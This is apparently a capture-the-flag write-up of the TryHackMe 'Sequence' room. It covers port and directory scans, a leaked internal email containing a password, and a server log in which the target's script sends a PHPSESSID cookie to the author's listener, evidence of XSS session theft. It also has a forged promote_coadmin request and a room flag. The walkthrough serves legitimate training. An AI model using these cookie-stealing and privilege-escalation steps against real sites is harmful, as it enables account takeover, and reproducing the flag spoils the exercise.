<h1 align="center">Sequence</h1>
<p align="center"><img width="80px" src=""><br>
2025, September 18<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>500</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Chain multiple vulnerabilities to take control of a system.<br>
Access it <a href="https://tryhackme.com/room/sequence">here</a>.<br>
<img width="1200px" src=""></p>

<h1 align="center">Task 1 . Challenge</h1>


```bash
:~/Sequence# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Review Shopclear

```

<h2 align="center">/etc/hosts</h2>

```bash
xx.xxx.xx.xx reviewshop.thm
```

<h2 align="center">gobuster</h2>

```bash
:~/Sequence# gobuster dir -u http://reviewshop.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,js,html -q -k -e -t 60
http://reviewshop.thm/.php                 (Status: 403) [Size: 279]
http://reviewshop.thm/.html                (Status: 403) [Size: 279]
http://reviewshop.thm/index.php            (Status: 200) [Size: 1694]
http://reviewshop.thm/contact.php          (Status: 200) [Size: 2246]
http://reviewshop.thm/new.html             (Status: 200) [Size: 562]
http://reviewshop.thm/login.php            (Status: 200) [Size: 1944]
http://reviewshop.thm/uploads              (Status: 301) [Size: 318] [--> http://reviewshop.thm/uploads/]
http://reviewshop.thm/header.php           (Status: 200) [Size: 1400]
http://reviewshop.thm/mail                 (Status: 301) [Size: 315] [--> http://reviewshop.thm/mail/]
http://reviewshop.thm/chat.php             (Status: 302) [Size: 0] [--> login.php]
http://reviewshop.thm/db.php               (Status: 200) [Size: 0]
http://reviewshop.thm/javascript           (Status: 301) [Size: 321] [--> http://reviewshop.thm/javascript/]
http://reviewshop.thm/logout.php           (Status: 302) [Size: 0] [--> index.php]
http://reviewshop.thm/settings.php         (Status: 302) [Size: 0] [--> login.php]
http://reviewshop.thm/dashboard.php        (Status: 302) [Size: 1400] [--> login.php]
http://reviewshop.thm/phpmyadmin           (Status: 301) [Size: 321] [--> http://reviewshop.thm/phpmyadmin/]
http://reviewshop.thm/.html                (Status: 403) [Size: 279]
http://reviewshop.thm/.php                 (Status: 403) [Size: 279]
http://reviewshop.thm/server-status        (Status: 403) [Size: 279]
```

<img width="1176" height="345" alt="image" src="https://github.com/user-attachments/assets/e410747d-2a53-4882-903e-5840a0176a20" />


```bash
:~/Sequence# gobuster dir -u http://reviewshop.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php -t 60

...
/index.php            (Status: 200) [Size: 1694]
/contact.php          (Status: 200) [Size: 2246]
/login.php            (Status: 200) [Size: 1944]
/uploads              (Status: 301) [Size: 318] [--> http://reviewshop.thm/uploads/]
/header.php           (Status: 200) [Size: 1400]
/mail                 (Status: 301) [Size: 315] [--> http://reviewshop.thm/mail/]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/db.php               (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 321] [--> http://reviewshop.thm/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/settings.php         (Status: 302) [Size: 0] [--> login.php]
/dashboard.php        (Status: 302) [Size: 1400] [--> login.php]
/phpmyadmin           (Status: 301) [Size: 321] [--> http://reviewshop.thm/phpmyadmin/]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 415286 / 415288 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
:~/Sequence# ffuf -u 'http://reviewshop.thm/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc all -t 100 -fc 403,404 -e .php -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://reviewshop.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 403,404
________________________________________________

contact.php             [Status: 200, Size: 2246, Words: 388, Lines: 87]
                        [Status: 200, Size: 1694, Words: 234, Lines: 69]
index.php               [Status: 200, Size: 1694, Words: 234, Lines: 69]
login.php               [Status: 200, Size: 1944, Words: 329, Lines: 79]
mail                    [Status: 301, Size: 315, Words: 20, Lines: 10]
header.php              [Status: 200, Size: 1400, Words: 204, Lines: 60]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
chat.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
settings.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
dashboard.php           [Status: 302, Size: 1400, Words: 204, Lines: 60]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
                        [Status: 200, Size: 1694, Words: 234, Lines: 69]
:: Progress: [415260/415260] :: Job [1/1] :: 9623 req/sec :: Duration: [0:00:33] :: Errors: 0 ::

```


```bash
:~/Sequence# curl -s 'http://reviewshop.thm/mail/dump.txt'
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert


```


finance.php
lottery.php(S60u}f5j)

<img width="1115" height="305" alt="image" src="https://github.com/user-attachments/assets/063c4453-6b0f-435c-99a1-ecaeaf943a9d" />


<img width="1132" height="361" alt="image" src="https://github.com/user-attachments/assets/8148f26e-536c-4070-bea6-05c4b7b275a4" />



<img width="1130" height="498" alt="image" src="https://github.com/user-attachments/assets/813e396f-c952-4625-8847-625000bde1b5" />





<img width="1060" height="524" alt="image" src="https://github.com/user-attachments/assets/1d2b7c20-cd75-458a-b948-ec8201690f15" />



~/Sequence# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.83.96 - - [23/Sep/2025 20:28:25] "GET /testing.js HTTP/1.1" 200 -
10.201.83.96 - - [23/Sep/2025 20:28:25] "GET /?cookie=PHPSESSID=dg55qdecrcaibv591scv5j0ael HTTP/1.1" 200 -


<img width="697" height="138" alt="image" src="https://github.com/user-attachments/assets/1ad3df60-a7e3-4033-bb17-287476101849" />


<img width="957" height="407" alt="image" src="https://github.com/user-attachments/assets/d4849f9a-2e2d-4672-9497-16d7e60cf07f" />




<p>1.1. What is the flag value after logging in as <strong>mod</strong?<br>
        <code></code>THM{M0dH@ck3dPawned007}</p>code></p>


<img width="1118" height="333" alt="image" src="https://github.com/user-attachments/assets/c59001e2-4c41-4ab4-9ef1-54af88a65148" />

<img width="952" height="629" alt="image" src="https://github.com/user-attachments/assets/0d2c5e81-e1b9-428f-8a21-3a1bfa13d122" />

MD5

<img width="1353" height="258" alt="image" src="https://github.com/user-attachments/assets/bc2c5c66-cc9f-43b1-857a-84b9002bf35d" />



<img width="951" height="620" alt="image" src="https://github.com/user-attachments/assets/1059c46b-860c-4bd6-82ab-7bf8c85711d2" />


GET /promote_coadmin.php?username=ad148a3ca8bd0ef3b48c52454c493ec5&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3 HTTP/1.1
Host: reviewshop.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://reviewshop.thm/settings.php
Connection: keep-alive
Cookie: PHPSESSID=dg55qdecrcaibv591scv5j0ael
Priority: u=0


HTTP/1.1 200 OK
Date: Tue, 23 Sep 2025 19:42:24 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 90
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<div class='alert alert-danger'>This feature is currently only available for admins.</div>



        <img width="961" height="412" alt="image" src="https://github.com/user-attachments/assets/8acab50e-978e-475a-8dd3-664204b39b92" />

<img width="955" height="623" alt="image" src="https://github.com/user-attachments/assets/0c75661f-d026-4e74-a7cb-74907e0c14cd" />





